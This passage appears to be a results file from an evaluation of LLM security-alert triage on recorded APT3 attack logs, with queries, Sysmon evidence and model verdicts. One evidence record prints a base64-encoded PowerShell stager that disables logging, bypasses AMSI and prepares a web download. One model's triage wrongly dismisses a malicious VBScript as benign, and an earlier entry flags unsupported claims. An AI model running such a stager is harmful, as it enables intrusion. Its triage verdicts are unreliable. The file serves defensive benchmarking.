AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:40.359Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:45.530Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:50.671Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:16:55.608Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:17:00.734Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:17:05.890Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:17:11.062Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:17:16.015Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T23:17:21.187Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null,  \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "Please provide the full decoded content of the Base64 encoded command line for the powershell.exe process on HFDC01.shire.com at 2019-05-14T23:16:10.695Z, ensuring no parts are truncated.",
        "evidence": "1 record(s):\n[{\"TimeCreated\": \"2019-05-14T23:16:10.695Z\", \"Computer\": \"HFDC01.shire.com\", \"User\": \"NT AUTHORITY\\\\SYSTEM\", \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AYQBKAE8AcgAgAC0ARwBlACAAMwApAHsAJAA4AEQAQQBjADEAPQBbAFIARQBmAF0ALgBBAFMAcwBFAE0AQgBMAHkALgBHAGUAVABUAFkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAOABEAEEAQwAxACkAewAkADMAMgBlADQARgA9ACQAOABkAEEAQwAxAC4ARwBlAHQAVgBBAGwAdQBlACgAJABuAHUATABMACkAOwBJAEYAKAAkADMAMgBFADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADMAMgBlADQARgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAAzADIARQA0AGYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABlAGMAVABJAG8AbgBTAC4ARwBFAG4ARQBSAGkAQwAuAEQASQBjAFQAaQBPAG4AQQByAHkAWwBTAHQAcgBpAG4ARwAsAFMAeQBTAHQAZQBNAC4ATwBiAEoAZQBjAFQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAMwAyAEUANABmAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAFMARQB7AFsAUwBDAHIAaQBwAFQAQgBMAE8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATABVAGUAKAAkAG4AVQBMAEwALAAoAE4AZQB3AC0ATwBiAGoARQBDAFQAIABDAE8AbABMAEUAQwBUAEkAbwBOAHMALgBHAEUAbgBlAFIASQBDAC4ASABBAFMASABTAGUAdABbAHMAdAByAEkAbgBnAF0AKQApAH0AJABSAEUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAGUATQBCAEwAeQAuAEcAZQBUAFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAEUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEAbABVAEUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AEUAKQA7AH0AOwBbAFMAeQBTAFQARQBNAC4ATgBlAHQALgBTAEUAcgBWAGkAQwBFAFAATwBJAG4AdABNAGEATgBBAEcARQBSAF0AOgA6AEUAeABQAEUAQwBUADEAMAAwAEMATwBuAFQAaQBuAFUARQA9ADAAOwAkADQAMwBFAGYAMwA9AE4ARQB3AC0ATwBiAEoARQBjAFQAIABTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAEkAZQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANAAzAGUAZgAzAC4ASABFAGEAZABlAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUARgAzAC4ASABlAGEAZABlAHIAcwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQANAAzAGUAZgAzAC4AUAByAG8AeAB5AD0AWwBTAFkAUwB0AGUATQAuAE4AZQB0AC4AVwBFAEIAUgBlAHEAdQBlAHMAVABdADoAOgBEAEUARgBhAFUAbAB0AFcAZQBCAFAAUgBPAFgAeQA7ACQANAAzAGUAZgAzAC4AUABSAG8AeAB5AC4AQwBSAGUAZABFAG4AVABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABlAG0ALgBOAGUAdAAuAEMAcgBlAGQARQBuAHQASQBBAEwAQwBhAGMAaABlAF0AOgA6AEQARQBGAEEAdQBMAHQATgBlAFQAdwBPAFIASwBDAHIARQBEAGUAbgB0AGkAYQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8A \u2026[truncated \u2014 ask for fewer columns or rows]"
      }
    ],
    "grounding_rounds": 2,
    "grounding_unsupported": [
      "A malicious service on HFDC01.shire.com executed a VBScript",
      "The process tree shows services.exe spawning cmd.exe",
      "The subsequent execution of wscript.exe and then powershell.exe with a heavily encoded command (decoded to show registry modification of ExecutionPolicy and Net.WebClient initialization) confirms malicious intent."
    ],
    "zero_evidence_rounds": 0
  },
  {
    "model": "gemma4:12b-it-q8_0",
    "dataset": "apt3",
    "rule": "execution_wscript_vbs",
    "title": "WScript VBScript Execution",
    "timestamp": "2019-05-14T22:32:22.132Z",
    "computer": "HR001.shire.com",
    "image": "C:\\Windows\\System32\\wscript.exe",
    "command_line": "\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\nmartha\\Downloads\\autoupdate.vbs\" ",
    "event_id": "1",
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "triage": {
      "summary": "The execution of 'autoupdate.vbs' by wscript.exe was triggered from the user's Downloads folder via explorer.exe. While VBScript in a downloads folder can be suspicious, there is no evidence of malicious activity: no child processes were spawned, no network connections were established, and no registry modifications or BITS jobs were created during the execution window.",
      "technique": "unknown",
      "technique_name": "unknown",
      "confidence": 0.85,
      "disposition": "benign_true_positive",
      "reasoning": "The process 'wscript.exe' executed 'autoupdate.vbs' (EventID 1) but failed to perform any subsequent actions typically associated with malware (no child processes in Q1, no network connections in Q3, no BITS jobs in Q5, and no registry modifications in Q6). The user activity around the time shows standard browser usage (MicrosoftEdgeCP.exe) and system tasks.",
      "scope": {
        "systems": [],
        "users": [],
        "data": "",
        "timeframe": ""
      },
      "escalate": false,
      "escalation_rationale": "The activity appears to be a non-functional or benign script execution with no observable impact on the system or network.",
      "recommended_actions": [
        "Inform the user about risks of running scripts from Downloads",
        "Delete the autoupdate.vbs file if not recognized by the user"
      ],
      "queries_run": [
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HR001.shire.com' AND TimeCreated LIKE '2019-05-14T22:32:22%' AND ParentImage LIKE '%wscript.exe%' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HR001.shire.com' AND Image LIKE '%wscript.exe%' AND TimeCreated BETWEEN '2019-05-14T22:31:00Z' AND '2019-05-14T22:34:00Z' LIMIT 20;",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, IpAddress\nFROM logs\nWHERE Image LIKE '%wscript.exe%'\n  AND Computer = 'HR001.shire.com'\n  AND TimeCreated BETWEEN '2019-05-14T22:32:00Z' AND '2019-05-14T22:33:00Z'\nLIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Channel LIKE '%Microsoft-Windows-PowerShell/Operational%' AND User LIKE '%SHIRE\\nmartha%' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' AND Image LIKE '%wscript.exe%' AND (CommandLine LIKE '%bitsadmin%' OR CommandLine LIKE '%BITS%') LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine, EventID, TargetImage FROM logs WHERE Computer = 'HR001.shire.com' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' AND EventID IN (12, 13, 14) LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE User LIKE '%SHIRE\\nmartha%' AND Computer LIKE '%HR001.shire.com%' AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' LIMIT 20",
        "SELECT TimeCreated, Computer, User, Image, CommandLine, ParentImage, ParentCommandLine FROM logs WHERE Computer = 'HR001.shire.com' AND EventID = 11 AND TimeCreated BETWEEN '2019-05-14T22:30:00Z' AND '2019-05-14T22:35:00Z' LIMIT 20"
      ]
    },
    "fallback_used": false,
    "fallback_reason": null,
    "ground_truth_verdict": "bad",
    "evidence_trail": [
      {
        "question": "What were the child processes spawned by wscript.exe at 2019-05-14T22:32:22 on host HR001.shire.com?",
        "evidence": "No matching records found for: What were the child processes spawned by wscript.exe at 2019-05-14T22:32:22 on host HR001.shire.com?"
      },
      {
        "question": "What were the network connections and file creations made by wscript.exe on host HR001.shire.com around 2019-05-14T22:32:22?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:22.132Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WScript.exe\\\" \\\"C:\\\\Users\\\\nmartha\\\\Downloads\\\\autoupdate.vbs\\\" \", \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\Explorer.EXE\"}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.311Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.311Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.311Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.311Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLi \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What were the specific network connections (destination IP, port, and protocol) made by wscript.exe on host HR001.shire.com between 2019-05-14T22:32:00Z and 2019-05-14T22:33:00Z?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:32:22.132Z\", \"Computer\": \"HR001.shire.com\", \"User\": \"SHIRE\\\\nmartha\", \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": \"\\\"C:\\\\Windows\\\\System32\\\\WScript.exe\\\" \\\"C:\\\\Users\\\\nmartha\\\\Downloads\\\\autoupdate.vbs\\\" \", \"ParentImage\": \"C:\\\\Windows\\\\explorer.exe\", \"ParentCommandLine\": \"C:\\\\Windows\\\\Explorer.EXE\", \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.308Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.309Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.310Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.311Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T22:32:22.311Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"IpAddress\": null}, {\"TimeCreated\": \"2019-05-14T2 \u2026[truncated \u2014 ask for fewer columns or rows]\n(Showing the first 20 records; there may be more \u2014 ask a more specific question to narrow it down.)"
      },
      {
        "question": "What were the PowerShell script-block logs (Microsoft-Windows-PowerShell/Operational) for user SHIRE\\nmartha between 2019-05-14T22:30:00Z and 2019-05-14T22:35:00Z?",
        "evidence": "No matching records found for: What were the PowerShell script-block logs (Microsoft-Windows-PowerShell/Operational) for user SHIRE\\nmartha between 2019-05-14T22:30:00Z and 2019-05-14T22:35:00Z?"
      },
      {
        "question": "Were there any BITS jobs created or used by wscript.exe on host HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T22:35:00Z?",
        "evidence": "No matching records found for: Were there any BITS jobs created or used by wscript.exe on host HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T22:35:00Z?"
      },
      {
        "question": "What registry keys were modified by wscript.exe or any other process on host HR001.shire.com between 2019-05-14T22:30:00Z and 2019-05-14T22:35:00Z?",
        "evidence": "20 record(s):\n[{\"TimeCreated\": \"2019-05-14T22:31:26.793Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.793Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"13\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"13\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"13\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"12\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, \"ParentImage\": null, \"ParentCommandLine\": null, \"EventID\": \"13\", \"TargetImage\": null}, {\"TimeCreated\": \"2019-05-14T22:31:26.916Z\", \"Computer\": \"HR001.shire.com\", \"User\": null, \"Image\": \"C:\\\\Windows\\\\system32\\\\LogonUI.exe\", \"CommandLine\": null, 